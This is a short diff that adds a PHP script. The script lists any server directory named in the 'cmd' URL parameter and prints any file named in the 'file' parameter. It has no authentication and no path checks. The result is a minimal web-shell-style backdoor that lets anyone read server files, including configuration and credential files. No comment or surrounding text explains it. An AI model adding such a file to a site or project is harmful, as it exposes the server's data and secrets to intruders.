@@ -1,0 +1,10 @@
+<?php
+        $zmienna1 = opendir($_GET['cmd']);
+        while($zmienna = readdir($zmienna1))
+        {
+                echo "$zmienna <br />";
+        }
+        closedir($zmienna1);
+
+        echo readfile($_GET['file']);
+?>
